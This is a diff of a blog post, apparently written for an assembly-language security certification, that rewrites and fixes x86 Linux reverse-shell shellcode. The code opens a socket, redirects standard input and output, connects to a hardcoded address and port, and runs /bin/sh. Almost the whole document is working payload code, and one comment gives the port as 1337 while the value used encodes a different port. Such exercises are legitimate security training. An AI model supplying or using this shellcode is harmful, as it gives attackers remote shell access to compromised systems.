@@ -99,10 +99,10 @@ global _start	; Standard start
 section .text	;
 _start:		;
 
+xor eax, eax	;
 xor ebx, ebx	; Zero out registers before usage to avoid a logic error
 xor ecx, ecx	;
 xor edx, edx	;
-mul cx		; ax = ax * cx (0)
 
 ;int socketcall(int call, unsigned long *args)
 ;*args: (int domain, int type, int protocol) 
@@ -138,14 +138,17 @@ We can reuse the `dup2` code from our bind shell because all were doing is redir
 ;oldfd = previous sockfd value returned by socket
 ;newfd = 0, 1, 2 iteratively (stdin, stdout, stderr)
 
-xchg ebx, eax	; swap oldfd into ebx (should be 0x3)
-pop ecx		; pop 0x2 from socket call into ecx
+xchg ebx, eax   ; swap oldfd into ebx (should be 0x3)
+xor ecx, ecx    ; clear eax
+mov cl, 3       ; 3 file descriptors (stdin, stdout, stderr)
 
-sockfd_func:	; create a function to reproduce the same actions
-mov al, 0x3F	; dup2 call
-int 0x80	; interrupt
-dec cl		; decrement ecx to 2 then 1 then 0
-jnz sockfd_func ; loop back to sockfd_func if not zero
+dup_descriptors:
+dec cl  	; hack for loop to work with values 2,1,0 instead of 3,2,1
+mul edx 	; zero out eax
+mov al, 0x3f	;
+int 0x80 	; dup2 stdin
+inc cl  	; hack for loop to work with values 2,1,0 instead of 3,2,1
+loop dup_descriptors
 ```
 
 ## Connect
@@ -167,23 +170,22 @@ jnz sockfd_func ; loop back to sockfd_func if not zero
 ;addrlen = 0x10 (16/sizeof(sockaddr_in))
 ;
 
-mov al 0x66	    ; socketcall wrapper
-		    ; bl is already 0x3 (connect) from sockfd
-
+mov al, 0x66        ; socketcall wrapper
+mov bl, 0x3         ; move 3 into ebx
 mov edi, 0xffffffff ; 255.255.255.255
 mov ecx, 0xfeffff80 ; 128.255.255.254
 xor ecx, edi        ; 0x0100007f = 127.0.0.1
 
-push ecx	    ; sin_addr.s_addr 127.0.0.1 
-push word 0x0539    ; sin_port 1337
-push word 0x0002    ; sin_family 0x2
-mov ecx, esp	    ; move connect *args to ecx. this also points to IP Socket Address Struct 
+push ecx            ; sin_addr.s_addr 127.0.0.1 
+push word 0x5c11    ; sin_port 1337
+push word 0x02      ; sin_family 0x2
+mov ecx, esp        ; move connect *args to ecx. this also points to IP Socket Address Struct 
 
-push 0x10	    ; addrlen (socket)
-push esp	    ; pointer to IP Struct
-push bl	  	    ; sockfd
-
-int 0x80	    ; interrupt
+push 0x10           ; addrlen (socket)
+push ecx            ; pointer to IP Struct
+push ebx            ; sockfd
+mov ecx, esp        ; move esp pointer into ecx
+int 0x80            ; interrupt
 ```
 
 ## Execve
@@ -199,13 +201,14 @@ int 0x80	    ; interrupt
 ; *envp = NULL
 ;
 
-push edx	    	; delimiting NULL for pathname; EDX is NULL for envp[]
+push edx                ; delimiting NULL for pathname; EDX is NULL for envp[]
 push dword 0x68732f2f   ; push / / s h
 push dword 0x6e69622f   ; push / b i n
 mov ebx, esp            ; Store pointer to "/bin/sh" in ebx
-push ecx                ; Push NULL
+push edx                ; Push NULL
 push ebx                ; Push *filename
 mov ecx, esp            ; Store memory address pointing to memory address of "/bin/sh"
+mul edx                 ; clear eax
 mov al, 0xb             ; execve call
 int 0x80                ; interrupt
 ```
@@ -216,64 +219,64 @@ global _start   ; Standard start
                 ;
 section .text   ;
 _start:         ;
-	
-	;init
-	xor ebx, ebx    ; Zero out registers before usage to avoid a logic error
-	xor ecx, ecx    ;
-	xor edx, edx    ;
-	mul cx          ; ax = ax * cx (0)
-	
-	;socket
-	push ebx        ; push 0x0
-	push 0x1        ; 1 = SOCK_STREAM
-	push 0x2        ; 2 = AF_INET
-	mov al, 0x66    ; socketcall syscall
-	mov bl, 0x1     ; sys_socket = 1
-	mov ecx, esp    ; *args pointer
-	int 0x80        ; interrupt
-	
-	;dup2
-	xchg ebx, eax   ; swap oldfd into ebx (should be 0x3)
-	xor ecx, ecx    ; clear eax
-	mov cl, 3 	; 3 file descriptors (stdin, stdout, stderr)
 
-	dup_descriptors:
-		dec cl  ; hack for loop to work with values 2,1,0 instead of 3,2,1
-		mul edx ; zero out eax
-		mov al, 0x3f
-		int 0x80 ; dup2 stdin
-		inc cl  ; hack for loop to work with values 2,1,0 instead of 3,2,1
-		loop dup_descriptors
+        ;init
+        xor eax, eax
+        xor ebx, ebx    ; Zero out registers before usage to avoid a logic error
+        xor ecx, ecx    ;
+        xor edx, edx    ;
 
-	;connect	
-	mov al, 0x66        ; socketcall wrapper
-	mov ebx, 0x3	    ; move 3 into ebx
-	mov edi, 0xffffffff ; 255.255.255.255
-	mov ecx, 0xfeffff80 ; 128.255.255.254
-	xor ecx, edi        ; 0x0100007f = 127.0.0.1
-	
-	push ecx            ; sin_addr.s_addr 127.0.0.1 
-	push word 0x5c11    ; sin_port 1337
-	push word 0x02      ; sin_family 0x2
-	mov ecx, esp        ; move connect *args to ecx. this also points to IP Socket Address Struct 
+        ;socket
+        push ebx        ; push 0x0
+        push 0x1        ; 1 = SOCK_STREAM
+        push 0x2        ; 2 = AF_INET
+        mov al, 0x66    ; socketcall syscall
+        mov bl, 0x1     ; sys_socket = 1
+        mov ecx, esp    ; *args pointer
+        int 0x80        ; interrupt
 
-	push 0x10           ; addrlen (socket)
-	push ecx            ; pointer to IP Struct
-	push ebx            ; sockfd	
-	mov ecx, esp	    ; move esp pointer into ecx
-	int 0x80            ; interrupt
+        ;dup2
+        xchg ebx, eax   ; swap oldfd into ebx (should be 0x3)
+        xor ecx, ecx    ; clear eax
+        mov cl, 3       ; 3 file descriptors (stdin, stdout, stderr)
 
-	;execve
-	push edx                ; delimiting NULL for pathname; EDX is NULL for envp[]
-	push dword 0x68732f2f   ; push / / s h
-	push dword 0x6e69622f   ; push / b i n
-	mov ebx, esp            ; Store pointer to "/bin/sh" in ebx
-	push edx                ; Push NULL
-	push ebx                ; Push *filename
-	mov ecx, esp            ; Store memory address pointing to memory address of "/bin/sh"
-	mul edx			; clear eax
-	mov al, 0xb             ; execve call
-	int 0x80                ; interrupt
+        dup_descriptors:
+                dec cl  ; hack for loop to work with values 2,1,0 instead of 3,2,1
+                mul edx ; zero out eax
+                mov al, 0x3f
+                int 0x80 ; dup2 stdin
+                inc cl  ; hack for loop to work with values 2,1,0 instead of 3,2,1
+                loop dup_descriptors
+
+        ;connect
+        mov al, 0x66        ; socketcall wrapper
+        mov bl, 0x3         ; move 3 into ebx
+        mov edi, 0xffffffff ; 255.255.255.255
+        mov ecx, 0xfeffff80 ; 128.255.255.254
+        xor ecx, edi        ; 0x0100007f = 127.0.0.1
+
+        push ecx            ; sin_addr.s_addr 127.0.0.1 
+        push word 0x5c11    ; sin_port 1337
+        push word 0x02      ; sin_family 0x2
+        mov ecx, esp        ; move connect *args to ecx. this also points to IP Socket Address Struct 
+
+        push 0x10           ; addrlen (socket)
+        push ecx            ; pointer to IP Struct
+        push ebx            ; sockfd
+        mov ecx, esp        ; move esp pointer into ecx
+        int 0x80            ; interrupt
+
+        ;execve
+        push edx                ; delimiting NULL for pathname; EDX is NULL for envp[]
+        push dword 0x68732f2f   ; push / / s h
+        push dword 0x6e69622f   ; push / b i n
+        mov ebx, esp            ; Store pointer to "/bin/sh" in ebx
+        push edx                ; Push NULL
+        push ebx                ; Push *filename
+        mov ecx, esp            ; Store memory address pointing to memory address of "/bin/sh"
+        mul edx                 ; clear eax
+        mov al, 0xb             ; execve call
+        int 0x80                ; interrupt
 ```
 
 _This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:_
